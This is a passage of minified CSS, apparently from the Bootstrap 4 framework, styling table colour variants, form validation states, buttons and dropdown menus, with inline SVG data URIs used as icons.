.table-warning:hover>td,.table-hover .table-warning:hover>th{background-color:#ffe8a1}.table-danger,.table-danger>td,.table-danger>th{background-color:#f5c6cb}.table-danger tbody+tbody,.table-danger td,.table-danger th,.table-danger thead th{border-color:#ed969e}.table-hover .table-danger:hover{background-color:#f1b0b7}.table-hover .table-danger:hover>td,.table-hover .table-danger:hover>th{background-color:#f1b0b7}.table-light,.table-light>td,.table-light>th{background-color:#fdfdfe}.table-light tbody+tbody,.table-light td,.table-light th,.table-light thead th{border-color:#fbfcfc}.table-hover .table-light:hover{background-color:#ececf6}.table-hover .table-light:hover>td,.table-hover .table-light:hover>th{background-color:#ececf6}.table-dark,.table-dark>td,.table-dark>th{background-color:#c6c8ca}.table-dark tbody+tbody,.table-dark td,.table-dark th,.table-dark thead th{border-color:#95999c}.table-hover .table-dark:hover{background-color:#b9bbbe}.table-hover .table-dark:hover>td,.table-hover .table-dark:hover>th{background-color:#b9bbbe}.table-active,.table-active>td,.table-active>th{background-color:rgba(0,0,0,.075)}.table-hover .table-active:hover{background-color:rgba(0,0,0,.075)}.table-hover .table-active:hover>td,.table-hover .table-active:hover>th{background-color:rgba(0,0,0,.075)}.table .thead-dark th{color:#fff;background-color:#343a40;border-color:#454d55}.table .thead-light th{color:#495057;background-color:#e9ecef;border-color:#dee2e6}.table-dark{color:#fff;background-color:#343a40}.table-dark td,.table-dark th,.table-dark thead th{border-color:#454d55}.table-dark.table-bordered{border:0}.table-dark.table-striped tbody tr:nth-of-type(odd){background-color:rgba(255,255,255,.05)}.table-dark.table-hover tbody tr:hover{color:#fff;background-color:rgba(255,255,255,.075)}@media (max-width:575.98px){.table-responsive-sm{display:block;width:100%;overflow-x:auto;-webkit-overflow-scrolling:touch}.table-responsive-sm>.table-bordered{border:0}}@media (max-width:767.98px){.table-responsive-md{display:block;width:100%;overflow-x:auto;-webkit-overflow-scrolling:touch}.table-responsive-md>.table-bordered{border:0}}@media (max-width:991.98px){.table-responsive-lg{display:block;width:100%;overflow-x:auto;-webkit-overflow-scrolling:touch}.table-responsive-lg>.table-bordered{border:0}}@media (max-width:1199.98px){.table-responsive-xl{display:block;width:100%;overflow-x:auto;-webkit-overflow-scrolling:touch}.table-responsive-xl>.table-bordered{border:0}}.table-responsive{display:block;width:100%;overflow-x:auto;-webkit-overflow-scrolling:touch}.table-responsive>.table-bordered{border:0}.form-control{display:block;width:100%;height:calc(1.5em + .75rem + 2px);padding:.375rem .75rem;font-size:1rem;font-weight:400;line-height:1.5;color:#495057;background-color:#fff;background-clip:padding-box;border:1px solid #ced4da;border-radius:.25rem;transition:border-color .15s ease-in-out,box-shadow .15s ease-in-out}@media (prefers-reduced-motion:reduce){.form-control{transition:none}}.form-control::-ms-expand{background-color:transparent;border:0}.form-control:-moz-focusring{color:transparent;text-shadow:0 0 0 #495057}.form-control:focus{color:#495057;background-color:#fff;border-color:#80bdff;outline:0;box-shadow:0 0 0 .2rem rgba(0,123,255,.25)}.form-control::-webkit-input-placeholder{color:#6c757d;opacity:1}.form-control::-moz-placeholder{color:#6c757d;opacity:1}.form-control:-ms-input-placeholder{color:#6c757d;opacity:1}.form-control::-ms-input-placeholder{color:#6c757d;opacity:1}.form-control::placeholder{color:#6c757d;opacity:1}.form-control:disabled,.form-control[readonly]{background-color:#e9ecef;opacity:1}input[type=date].form-control,input[type=datetime-local].form-control,input[type=month].form-control,input[type=time].form-control{-webkit-appearance:none;-moz-appearance:none;appearance:none}select.form-control:focus::-ms-value{color:#495057;background-color:#fff}.form-control-file,.form-control-range{display:block;width:100%}.col-form-label{padding-top:calc(.375rem + 1px);padding-bottom:calc(.375rem + 1px);margin-bottom:0;font-size:inherit;line-height:1.5}.col-form-label-lg{padding-top:calc(.5rem + 1px);padding-bottom:calc(.5rem + 1px);font-size:1.25rem;line-height:1.5}.col-form-label-sm{padding-top:calc(.25rem + 1px);padding-bottom:calc(.25rem + 1px);font-size:.875rem;line-height:1.5}.form-control-plaintext{display:block;width:100%;padding:.375rem 0;margin-bottom:0;font-size:1rem;line-height:1.5;color:#212529;background-color:transparent;border:solid transparent;border-width:1px 0}.form-control-plaintext.form-control-lg,.form-control-plaintext.form-control-sm{padding-right:0;padding-left:0}.form-control-sm{height:calc(1.5em + .5rem + 2px);padding:.25rem .5rem;font-size:.875rem;line-height:1.5;border-radius:.2rem}.form-control-lg{height:calc(1.5em + 1rem + 2px);padding:.5rem 1rem;font-size:1.25rem;line-height:1.5;border-radius:.3rem}select.form-control[multiple],select.form-control[size]{height:auto}textarea.form-control{height:auto}.form-group{margin-bottom:1rem}.form-text{display:block;margin-top:.25rem}.form-row{display:-ms-flexbox;display:flex;-ms-flex-wrap:wrap;flex-wrap:wrap;margin-right:-5px;margin-left:-5px}.form-row>.col,.form-row>[class*=col-]{padding-right:5px;padding-left:5px}.form-check{position:relative;display:block;padding-left:1.25rem}.form-check-input{position:absolute;margin-top:.3rem;margin-left:-1.25rem}.form-check-input:disabled~.form-check-label,.form-check-input[disabled]~.form-check-label{color:#6c757d}.form-check-label{margin-bottom:0}.form-check-inline{display:-ms-inline-flexbox;display:inline-flex;-ms-flex-align:center;align-items:center;padding-left:0;margin-right:.75rem}.form-check-inline .form-check-input{position:static;margin-top:0;margin-right:.3125rem;margin-left:0}.valid-feedback{display:none;width:100%;margin-top:.25rem;font-size:80%;color:#28a745}.valid-tooltip{position:absolute;top:100%;left:0;z-index:5;display:none;max-width:100%;padding:.25rem .5rem;margin-top:.1rem;font-size:.875rem;line-height:1.5;color:#fff;background-color:rgba(40,167,69,.9);border-radius:.25rem}.is-valid~.valid-feedback,.is-valid~.valid-tooltip,.was-validated :valid~.valid-feedback,.was-validated :valid~.valid-tooltip{display:block}.form-control.is-valid,.was-validated .form-control:valid{border-color:#28a745;padding-right:calc(1.5em + .75rem);background-image:url("data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' width='8' height='8' viewBox='0 0 8 8'%3e%3cpath fill='%2328a745' d='M2.3 6.73L.6 4.53c-.4-1.04.46-1.4 1.1-.8l1.1 1.4 3.4-3.8c.6-.63 1.6-.27 1.2.7l-4 4.6c-.43.5-.8.4-1.1.1z'/%3e%3c/svg%3e");background-repeat:no-repeat;background-position:right calc(.375em + .1875rem) center;background-size:calc(.75em + .375rem) calc(.75em + .375rem)}.form-control.is-valid:focus,.was-validated .form-control:valid:focus{border-color:#28a745;box-shadow:0 0 0 .2rem rgba(40,167,69,.25)}.was-validated textarea.form-control:valid,textarea.form-control.is-valid{padding-right:calc(1.5em + .75rem);background-position:top calc(.375em + .1875rem) right calc(.375em + .1875rem)}.custom-select.is-valid,.was-validated .custom-select:valid{border-color:#28a745;padding-right:calc(.75em + 2.3125rem);background:url("data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' width='4' height='5' viewBox='0 0 4 5'%3e%3cpath fill='%23343a40' d='M2 0L0 2h4zm0 5L0 3h4z'/%3e%3c/svg%3e") no-repeat right .75rem center/8px 10px,url("data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' width='8' height='8' viewBox='0 0 8 8'%3e%3cpath fill='%2328a745' d='M2.3 6.73L.6 4.53c-.4-1.04.46-1.4 1.1-.8l1.1 1.4 3.4-3.8c.6-.63 1.6-.27 1.2.7l-4 4.6c-.43.5-.8.4-1.1.1z'/%3e%3c/svg%3e") #fff no-repeat center right 1.75rem/calc(.75em + .375rem) calc(.75em + .375rem)}.custom-select.is-valid:focus,.was-validated .custom-select:valid:focus{border-color:#28a745;box-shadow:0 0 0 .2rem rgba(40,167,69,.25)}.form-check-input.is-valid~.form-check-label,.was-validated .form-check-input:valid~.form-check-label{color:#28a745}.form-check-input.is-valid~.valid-feedback,.form-check-input.is-valid~.valid-tooltip,.was-validated .form-check-input:valid~.valid-feedback,.was-validated .form-check-input:valid~.valid-tooltip{display:block}.custom-control-input.is-valid~.custom-control-label,.was-validated .custom-control-input:valid~.custom-control-label{color:#28a745}.custom-control-input.is-valid~.custom-control-label::before,.was-validated .custom-control-input:valid~.custom-control-label::before{border-color:#28a745}.custom-control-input.is-valid:checked~.custom-control-label::before,.was-validated .custom-control-input:valid:checked~.custom-control-label::before{border-color:#34ce57;background-color:#34ce57}.custom-control-input.is-valid:focus~.custom-control-label::before,.was-validated .custom-control-input:valid:focus~.custom-control-label::before{box-shadow:0 0 0 .2rem rgba(40,167,69,.25)}.custom-control-input.is-valid:focus:not(:checked)~.custom-control-label::before,.was-validated .custom-control-input:valid:focus:not(:checked)~.custom-control-label::before{border-color:#28a745}.custom-file-input.is-valid~.custom-file-label,.was-validated .custom-file-input:valid~.custom-file-label{border-color:#28a745}.custom-file-input.is-valid:focus~.custom-file-label,.was-validated .custom-file-input:valid:focus~.custom-file-label{border-color:#28a745;box-shadow:0 0 0 .2rem rgba(40,167,69,.25)}.invalid-feedback{display:none;width:100%;margin-top:.25rem;font-size:80%;color:#dc3545}.invalid-tooltip{position:absolute;top:100%;left:0;z-index:5;display:none;max-width:100%;padding:.25rem .5rem;margin-top:.1rem;font-size:.875rem;line-height:1.5;color:#fff;background-color:rgba(220,53,69,.9);border-radius:.25rem}.is-invalid~.invalid-feedback,.is-invalid~.invalid-tooltip,.was-validated :invalid~.invalid-feedback,.was-validated :invalid~.invalid-tooltip{display:block}.form-control.is-invalid,.was-validated .form-control:invalid{border-color:#dc3545;padding-right:calc(1.5em + .75rem);background-image:url("data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' width='12' height='12' fill='none' stroke='%23dc3545' viewBox='0 0 12 12'%3e%3ccircle cx='6' cy='6' r='4.5'/%3e%3cpath stroke-linejoin='round' d='M5.8 3.6h.4L6 6.5z'/%3e%3ccircle cx='6' cy='8.2' r='.6' fill='%23dc3545' stroke='none'/%3e%3c/svg%3e");background-repeat:no-repeat;background-position:right calc(.375em + .1875rem) center;background-size:calc(.75em + .375rem) calc(.75em + .375rem)}.form-control.is-invalid:focus,.was-validated .form-control:invalid:focus{border-color:#dc3545;box-shadow:0 0 0 .2rem rgba(220,53,69,.25)}.was-validated textarea.form-control:invalid,textarea.form-control.is-invalid{padding-right:calc(1.5em + .75rem);background-position:top calc(.375em + .1875rem) right calc(.375em + .1875rem)}.custom-select.is-invalid,.was-validated .custom-select:invalid{border-color:#dc3545;padding-right:calc(.75em + 2.3125rem);background:url("data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' width='4' height='5' viewBox='0 0 4 5'%3e%3cpath fill='%23343a40' d='M2 0L0 2h4zm0 5L0 3h4z'/%3e%3c/svg%3e") no-repeat right .75rem center/8px 10px,url("data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' width='12' height='12' fill='none' stroke='%23dc3545' viewBox='0 0 12 12'%3e%3ccircle cx='6' cy='6' r='4.5'/%3e%3cpath stroke-linejoin='round' d='M5.8 3.6h.4L6 6.5z'/%3e%3ccircle cx='6' cy='8.2' r='.6' fill='%23dc3545' stroke='none'/%3e%3c/svg%3e") #fff no-repeat center right 1.75rem/calc(.75em + .375rem) calc(.75em + .375rem)}.custom-select.is-invalid:focus,.was-validated .custom-select:invalid:focus{border-color:#dc3545;box-shadow:0 0 0 .2rem rgba(220,53,69,.25)}.form-check-input.is-invalid~.form-check-label,.was-validated .form-check-input:invalid~.form-check-label{color:#dc3545}.form-check-input.is-invalid~.invalid-feedback,.form-check-input.is-invalid~.invalid-tooltip,.was-validated .form-check-input:invalid~.invalid-feedback,.was-validated .form-check-input:invalid~.invalid-tooltip{display:block}.custom-control-input.is-invalid~.custom-control-label,.was-validated .custom-control-input:invalid~.custom-control-label{color:#dc3545}.custom-control-input.is-invalid~.custom-control-label::before,.was-validated .custom-control-input:invalid~.custom-control-label::before{border-color:#dc3545}.custom-control-input.is-invalid:checked~.custom-control-label::before,.was-validated .custom-control-input:invalid:checked~.custom-control-label::before{border-color:#e4606d;background-color:#e4606d}.custom-control-input.is-invalid:focus~.custom-control-label::before,.was-validated .custom-control-input:invalid:focus~.custom-control-label::before{box-shadow:0 0 0 .2rem rgba(220,53,69,.25)}.custom-control-input.is-invalid:focus:not(:checked)~.custom-control-label::before,.was-validated .custom-control-input:invalid:focus:not(:checked)~.custom-control-label::before{border-color:#dc3545}.custom-file-input.is-invalid~.custom-file-label,.was-validated .custom-file-input:invalid~.custom-file-label{border-color:#dc3545}.custom-file-input.is-invalid:focus~.custom-file-label,.was-validated .custom-file-input:invalid:focus~.custom-file-label{border-color:#dc3545;box-shadow:0 0 0 .2rem rgba(220,53,69,.25)}.form-inline{display:-ms-flexbox;display:flex;-ms-flex-flow:row wrap;flex-flow:row wrap;-ms-flex-align:center;align-items:center}.form-inline .form-check{width:100%}@media (min-width:576px){.form-inline label{display:-ms-flexbox;display:flex;-ms-flex-align:center;align-items:center;-ms-flex-pack:center;justify-content:center;margin-bottom:0}.form-inline .form-group{display:-ms-flexbox;display:flex;-ms-flex:0 0 auto;flex:0 0 auto;-ms-flex-flow:row wrap;flex-flow:row wrap;-ms-flex-align:center;align-items:center;margin-bottom:0}.form-inline .form-control{display:inline-block;width:auto;vertical-align:middle}.form-inline .form-control-plaintext{display:inline-block}.form-inline .custom-select,.form-inline .input-group{width:auto}.form-inline .form-check{display:-ms-flexbox;display:flex;-ms-flex-align:center;align-items:center;-ms-flex-pack:center;justify-content:center;width:auto;padding-left:0}.form-inline .form-check-input{position:relative;-ms-flex-negative:0;flex-shrink:0;margin-top:0;margin-right:.25rem;margin-left:0}.form-inline .custom-control{-ms-flex-align:center;align-items:center;-ms-flex-pack:center;justify-content:center}.form-inline .custom-control-label{margin-bottom:0}}.btn{display:inline-block;font-weight:400;color:#212529;text-align:center;vertical-align:middle;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;background-color:transparent;border:1px solid transparent;padding:.375rem .75rem;font-size:1rem;line-height:1.5;border-radius:.25rem;transition:color .15s ease-in-out,background-color .15s ease-in-out,border-color .15s ease-in-out,box-shadow .15s ease-in-out}@media (prefers-reduced-motion:reduce){.btn{transition:none}}.btn:hover{color:#212529;text-decoration:none}.btn.focus,.btn:focus{outline:0;box-shadow:0 0 0 .2rem rgba(0,123,255,.25)}.btn.disabled,.btn:disabled{opacity:.65}.btn:not(:disabled):not(.disabled){cursor:pointer}a.btn.disabled,fieldset:disabled a.btn{pointer-events:none}.btn-primary{color:#fff;background-color:#007bff;border-color:#007bff}.btn-primary:hover{color:#fff;background-color:#0069d9;border-color:#0062cc}.btn-primary.focus,.btn-primary:focus{color:#fff;background-color:#0069d9;border-color:#0062cc;box-shadow:0 0 0 .2rem rgba(38,143,255,.5)}.btn-primary.disabled,.btn-primary:disabled{color:#fff;background-color:#007bff;border-color:#007bff}.btn-primary:not(:disabled):not(.disabled).active,.btn-primary:not(:disabled):not(.disabled):active,.show>.btn-primary.dropdown-toggle{color:#fff;background-color:#0062cc;border-color:#005cbf}.btn-primary:not(:disabled):not(.disabled).active:focus,.btn-primary:not(:disabled):not(.disabled):active:focus,.show>.btn-primary.dropdown-toggle:focus{box-shadow:0 0 0 .2rem rgba(38,143,255,.5)}.btn-secondary{color:#fff;background-color:#6c757d;border-color:#6c757d}.btn-secondary:hover{color:#fff;background-color:#5a6268;border-color:#545b62}.btn-secondary.focus,.btn-secondary:focus{color:#fff;background-color:#5a6268;border-color:#545b62;box-shadow:0 0 0 .2rem rgba(130,138,145,.5)}.btn-secondary.disabled,.btn-secondary:disabled{color:#fff;background-color:#6c757d;border-color:#6c757d}.btn-secondary:not(:disabled):not(.disabled).active,.btn-secondary:not(:disabled):not(.disabled):active,.show>.btn-secondary.dropdown-toggle{color:#fff;background-color:#545b62;border-color:#4e555b}.btn-secondary:not(:disabled):not(.disabled).active:focus,.btn-secondary:not(:disabled):not(.disabled):active:focus,.show>.btn-secondary.dropdown-toggle:focus{box-shadow:0 0 0 .2rem rgba(130,138,145,.5)}.btn-success{color:#fff;background-color:#28a745;border-color:#28a745}.btn-success:hover{color:#fff;background-color:#218838;border-color:#1e7e34}.btn-success.focus,.btn-success:focus{color:#fff;background-color:#218838;border-color:#1e7e34;box-shadow:0 0 0 .2rem rgba(72,180,97,.5)}.btn-success.disabled,.btn-success:disabled{color:#fff;background-color:#28a745;border-color:#28a745}.btn-success:not(:disabled):not(.disabled).active,.btn-success:not(:disabled):not(.disabled):active,.show>.btn-success.dropdown-toggle{color:#fff;background-color:#1e7e34;border-color:#1c7430}.btn-success:not(:disabled):not(.disabled).active:focus,.btn-success:not(:disabled):not(.disabled):active:focus,.show>.btn-success.dropdown-toggle:focus{box-shadow:0 0 0 .2rem rgba(72,180,97,.5)}.btn-info{color:#fff;background-color:#17a2b8;border-color:#17a2b8}.btn-info:hover{color:#fff;background-color:#138496;border-color:#117a8b}.btn-info.focus,.btn-info:focus{color:#fff;background-color:#138496;border-color:#117a8b;box-shadow:0 0 0 .2rem rgba(58,176,195,.5)}.btn-info.disabled,.btn-info:disabled{color:#fff;background-color:#17a2b8;border-color:#17a2b8}.btn-info:not(:disabled):not(.disabled).active,.btn-info:not(:disabled):not(.disabled):active,.show>.btn-info.dropdown-toggle{color:#fff;background-color:#117a8b;border-color:#10707f}.btn-info:not(:disabled):not(.disabled).active:focus,.btn-info:not(:disabled):not(.disabled):active:focus,.show>.btn-info.dropdown-toggle:focus{box-shadow:0 0 0 .2rem rgba(58,176,195,.5)}.btn-warning{color:#212529;background-color:#ffc107;border-color:#ffc107}.btn-warning:hover{color:#212529;background-color:#e0a800;border-color:#d39e00}.btn-warning.focus,.btn-warning:focus{color:#212529;background-color:#e0a800;border-color:#d39e00;box-shadow:0 0 0 .2rem rgba(222,170,12,.5)}.btn-warning.disabled,.btn-warning:disabled{color:#212529;background-color:#ffc107;border-color:#ffc107}.btn-warning:not(:disabled):not(.disabled).active,.btn-warning:not(:disabled):not(.disabled):active,.show>.btn-warning.dropdown-toggle{color:#212529;background-color:#d39e00;border-color:#c69500}.btn-warning:not(:disabled):not(.disabled).active:focus,.btn-warning:not(:disabled):not(.disabled):active:focus,.show>.btn-warning.dropdown-toggle:focus{box-shadow:0 0 0 .2rem rgba(222,170,12,.5)}.btn-danger{color:#fff;background-color:#dc3545;border-color:#dc3545}.btn-danger:hover{color:#fff;background-color:#c82333;border-color:#bd2130}.btn-danger.focus,.btn-danger:focus{color:#fff;background-color:#c82333;border-color:#bd2130;box-shadow:0 0 0 .2rem rgba(225,83,97,.5)}.btn-danger.disabled,.btn-danger:disabled{color:#fff;background-color:#dc3545;border-color:#dc3545}.btn-danger:not(:disabled):not(.disabled).active,.btn-danger:not(:disabled):not(.disabled):active,.show>.btn-danger.dropdown-toggle{color:#fff;background-color:#bd2130;border-color:#b21f2d}.btn-danger:not(:disabled):not(.disabled).active:focus,.btn-danger:not(:disabled):not(.disabled):active:focus,.show>.btn-danger.dropdown-toggle:focus{box-shadow:0 0 0 .2rem rgba(225,83,97,.5)}.btn-light{color:#212529;background-color:#f8f9fa;border-color:#f8f9fa}.btn-light:hover{color:#212529;background-color:#e2e6ea;border-color:#dae0e5}.btn-light.focus,.btn-light:focus{color:#212529;background-color:#e2e6ea;border-color:#dae0e5;box-shadow:0 0 0 .2rem rgba(216,217,219,.5)}.btn-light.disabled,.btn-light:disabled{color:#212529;background-color:#f8f9fa;border-color:#f8f9fa}.btn-light:not(:disabled):not(.disabled).active,.btn-light:not(:disabled):not(.disabled):active,.show>.btn-light.dropdown-toggle{color:#212529;background-color:#dae0e5;border-color:#d3d9df}.btn-light:not(:disabled):not(.disabled).active:focus,.btn-light:not(:disabled):not(.disabled):active:focus,.show>.btn-light.dropdown-toggle:focus{box-shadow:0 0 0 .2rem rgba(216,217,219,.5)}.btn-dark{color:#fff;background-color:#343a40;border-color:#343a40}.btn-dark:hover{color:#fff;background-color:#23272b;border-color:#1d2124}.btn-dark.focus,.btn-dark:focus{color:#fff;background-color:#23272b;border-color:#1d2124;box-shadow:0 0 0 .2rem rgba(82,88,93,.5)}.btn-dark.disabled,.btn-dark:disabled{color:#fff;background-color:#343a40;border-color:#343a40}.btn-dark:not(:disabled):not(.disabled).active,.btn-dark:not(:disabled):not(.disabled):active,.show>.btn-dark.dropdown-toggle{color:#fff;background-color:#1d2124;border-color:#171a1d}.btn-dark:not(:disabled):not(.disabled).active:focus,.btn-dark:not(:disabled):not(.disabled):active:focus,.show>.btn-dark.dropdown-toggle:focus{box-shadow:0 0 0 .2rem rgba(82,88,93,.5)}.btn-outline-primary{color:#007bff;border-color:#007bff}.btn-outline-primary:hover{color:#fff;background-color:#007bff;border-color:#007bff}.btn-outline-primary.focus,.btn-outline-primary:focus{box-shadow:0 0 0 .2rem rgba(0,123,255,.5)}.btn-outline-primary.disabled,.btn-outline-primary:disabled{color:#007bff;background-color:transparent}.btn-outline-primary:not(:disabled):not(.disabled).active,.btn-outline-primary:not(:disabled):not(.disabled):active,.show>.btn-outline-primary.dropdown-toggle{color:#fff;background-color:#007bff;border-color:#007bff}.btn-outline-primary:not(:disabled):not(.disabled).active:focus,.btn-outline-primary:not(:disabled):not(.disabled):active:focus,.show>.btn-outline-primary.dropdown-toggle:focus{box-shadow:0 0 0 .2rem rgba(0,123,255,.5)}.btn-outline-secondary{color:#6c757d;border-color:#6c757d}.btn-outline-secondary:hover{color:#fff;background-color:#6c757d;border-color:#6c757d}.btn-outline-secondary.focus,.btn-outline-secondary:focus{box-shadow:0 0 0 .2rem rgba(108,117,125,.5)}.btn-outline-secondary.disabled,.btn-outline-secondary:disabled{color:#6c757d;background-color:transparent}.btn-outline-secondary:not(:disabled):not(.disabled).active,.btn-outline-secondary:not(:disabled):not(.disabled):active,.show>.btn-outline-secondary.dropdown-toggle{color:#fff;background-color:#6c757d;border-color:#6c757d}.btn-outline-secondary:not(:disabled):not(.disabled).active:focus,.btn-outline-secondary:not(:disabled):not(.disabled):active:focus,.show>.btn-outline-secondary.dropdown-toggle:focus{box-shadow:0 0 0 .2rem rgba(108,117,125,.5)}.btn-outline-success{color:#28a745;border-color:#28a745}.btn-outline-success:hover{color:#fff;background-color:#28a745;border-color:#28a745}.btn-outline-success.focus,.btn-outline-success:focus{box-shadow:0 0 0 .2rem rgba(40,167,69,.5)}.btn-outline-success.disabled,.btn-outline-success:disabled{color:#28a745;background-color:transparent}.btn-outline-success:not(:disabled):not(.disabled).active,.btn-outline-success:not(:disabled):not(.disabled):active,.show>.btn-outline-success.dropdown-toggle{color:#fff;background-color:#28a745;border-color:#28a745}.btn-outline-success:not(:disabled):not(.disabled).active:focus,.btn-outline-success:not(:disabled):not(.disabled):active:focus,.show>.btn-outline-success.dropdown-toggle:focus{box-shadow:0 0 0 .2rem rgba(40,167,69,.5)}.btn-outline-info{color:#17a2b8;border-color:#17a2b8}.btn-outline-info:hover{color:#fff;background-color:#17a2b8;border-color:#17a2b8}.btn-outline-info.focus,.btn-outline-info:focus{box-shadow:0 0 0 .2rem rgba(23,162,184,.5)}.btn-outline-info.disabled,.btn-outline-info:disabled{color:#17a2b8;background-color:transparent}.btn-outline-info:not(:disabled):not(.disabled).active,.btn-outline-info:not(:disabled):not(.disabled):active,.show>.btn-outline-info.dropdown-toggle{color:#fff;background-color:#17a2b8;border-color:#17a2b8}.btn-outline-info:not(:disabled):not(.disabled).active:focus,.btn-outline-info:not(:disabled):not(.disabled):active:focus,.show>.btn-outline-info.dropdown-toggle:focus{box-shadow:0 0 0 .2rem rgba(23,162,184,.5)}.btn-outline-warning{color:#ffc107;border-color:#ffc107}.btn-outline-warning:hover{color:#212529;background-color:#ffc107;border-color:#ffc107}.btn-outline-warning.focus,.btn-outline-warning:focus{box-shadow:0 0 0 .2rem rgba(255,193,7,.5)}.btn-outline-warning.disabled,.btn-outline-warning:disabled{color:#ffc107;background-color:transparent}.btn-outline-warning:not(:disabled):not(.disabled).active,.btn-outline-warning:not(:disabled):not(.disabled):active,.show>.btn-outline-warning.dropdown-toggle{color:#212529;background-color:#ffc107;border-color:#ffc107}.btn-outline-warning:not(:disabled):not(.disabled).active:focus,.btn-outline-warning:not(:disabled):not(.disabled):active:focus,.show>.btn-outline-warning.dropdown-toggle:focus{box-shadow:0 0 0 .2rem rgba(255,193,7,.5)}.btn-outline-danger{color:#dc3545;border-color:#dc3545}.btn-outline-danger:hover{color:#fff;background-color:#dc3545;border-color:#dc3545}.btn-outline-danger.focus,.btn-outline-danger:focus{box-shadow:0 0 0 .2rem rgba(220,53,69,.5)}.btn-outline-danger.disabled,.btn-outline-danger:disabled{color:#dc3545;background-color:transparent}.btn-outline-danger:not(:disabled):not(.disabled).active,.btn-outline-danger:not(:disabled):not(.disabled):active,.show>.btn-outline-danger.dropdown-toggle{color:#fff;background-color:#dc3545;border-color:#dc3545}.btn-outline-danger:not(:disabled):not(.disabled).active:focus,.btn-outline-danger:not(:disabled):not(.disabled):active:focus,.show>.btn-outline-danger.dropdown-toggle:focus{box-shadow:0 0 0 .2rem rgba(220,53,69,.5)}.btn-outline-light{color:#f8f9fa;border-color:#f8f9fa}.btn-outline-light:hover{color:#212529;background-color:#f8f9fa;border-color:#f8f9fa}.btn-outline-light.focus,.btn-outline-light:focus{box-shadow:0 0 0 .2rem rgba(248,249,250,.5)}.btn-outline-light.disabled,.btn-outline-light:disabled{color:#f8f9fa;background-color:transparent}.btn-outline-light:not(:disabled):not(.disabled).active,.btn-outline-light:not(:disabled):not(.disabled):active,.show>.btn-outline-light.dropdown-toggle{color:#212529;background-color:#f8f9fa;border-color:#f8f9fa}.btn-outline-light:not(:disabled):not(.disabled).active:focus,.btn-outline-light:not(:disabled):not(.disabled):active:focus,.show>.btn-outline-light.dropdown-toggle:focus{box-shadow:0 0 0 .2rem rgba(248,249,250,.5)}.btn-outline-dark{color:#343a40;border-color:#343a40}.btn-outline-dark:hover{color:#fff;background-color:#343a40;border-color:#343a40}.btn-outline-dark.focus,.btn-outline-dark:focus{box-shadow:0 0 0 .2rem rgba(52,58,64,.5)}.btn-outline-dark.disabled,.btn-outline-dark:disabled{color:#343a40;background-color:transparent}.btn-outline-dark:not(:disabled):not(.disabled).active,.btn-outline-dark:not(:disabled):not(.disabled):active,.show>.btn-outline-dark.dropdown-toggle{color:#fff;background-color:#343a40;border-color:#343a40}.btn-outline-dark:not(:disabled):not(.disabled).active:focus,.btn-outline-dark:not(:disabled):not(.disabled):active:focus,.show>.btn-outline-dark.dropdown-toggle:focus{box-shadow:0 0 0 .2rem rgba(52,58,64,.5)}.btn-link{font-weight:400;color:#007bff;text-decoration:none}.btn-link:hover{color:#0056b3;text-decoration:underline}.btn-link.focus,.btn-link:focus{text-decoration:underline}.btn-link.disabled,.btn-link:disabled{color:#6c757d;pointer-events:none}.btn-group-lg>.btn,.btn-lg{padding:.5rem 1rem;font-size:1.25rem;line-height:1.5;border-radius:.3rem}.btn-group-sm>.btn,.btn-sm{padding:.25rem .5rem;font-size:.875rem;line-height:1.5;border-radius:.2rem}.btn-block{display:block;width:100%}.btn-block+.btn-block{margin-top:.5rem}input[type=button].btn-block,input[type=reset].btn-block,input[type=submit].btn-block{width:100%}.fade{transition:opacity .15s linear}@media (prefers-reduced-motion:reduce){.fade{transition:none}}.fade:not(.show){opacity:0}.collapse:not(.show){display:none}.collapsing{position:relative;height:0;overflow:hidden;transition:height .35s ease}@media (prefers-reduced-motion:reduce){.collapsing{transition:none}}.dropdown,.dropleft,.dropright,.dropup{position:relative}.dropdown-toggle{white-space:nowrap}.dropdown-toggle::after{display:inline-block;margin-left:.255em;vertical-align:.255em;content:"";border-top:.3em solid;border-right:.3em solid transparent;border-bottom:0;border-left:.3em solid transparent}.dropdown-toggle:empty::after{margin-left:0}.dropdown-menu{position:absolute;top:100%;left:0;z-index:1000;display:none;float:left;min-width:10rem;padding:.5rem 0;margin:.125rem 0 0;font-size:1rem;color:#212529;text-align:left;list-style:none;background-color:#fff;background-clip:padding-box;border:1px solid rgba(0,0,0,.15);border-radius:.25rem}.dropdown-menu-left{right:auto;left:0}.dropdown-menu-right{right:0;left:auto}@media (min-width:576px){.dropdown-menu-sm-left{right:auto;left:0}.dropdown-menu-sm-right{right:0;left:auto}}@media (min-width:768px){.dropdown-menu-md-left{right:auto;left:0}.dropdown-menu-md-right{right:0;left:auto}}@media (min-width:992px){.dropdown-menu-lg-left{right:auto;left:0}.dropdown-menu-lg-right{right:0;left:auto}}@media (min-width:1200px){.dropdown-menu-xl-left{right:auto;left:0}.dropdown-menu-xl-right{right:0;left:auto}}.dropup .dropdown-menu{top:auto;bottom:100%;margin-top:0;margin-bottom:.125rem}.dropup .dropdown-toggle::after{display:inline-block;margin-left:.255em;vertical-align:.255em;content:"";border-top:0;border-right:.3em solid transparent;border-bottom:.3em solid;border-left:.3em solid transparent}.dropup .dropdown-toggle:empty::after{margin-left:0}.dropright .dropdown-menu{top:0;right:auto;left:100%;margin-top:0;margin-left:.125rem}.dropright .dropdown-toggle::after{display:inline-block;margin-left:.255em;vertical-align:.255em;content:"";border-top:.3em solid transparent;border-right:0;border-bottom:.3em solid transparent;border-left:.3em solid}.dropright .dropdown-toggle:empty::after{margin-left:0}.dropright .dropdown-toggle::after{vertical-align:0}.dropleft .dropdown-menu{top:0;right:100%;left:auto;margin-top:0;margin-right:.125rem}.dropleft .dropdown-toggle::after{display:inline-block;margin-left:.255em;vertical-align:.255em;content:""}.dropleft .dropdown-toggle::after{display:none}.dropleft .dropdown-toggle::before{display:inline-block;margin-right:.255em;vertical-align:.255em;content:"";border-top:.3em solid transparent;border-right:.3em solid;border-bottom:.3em solid transparent}.dropleft .dropdown-toggle:empty::after{margin-left:0}.dropleft 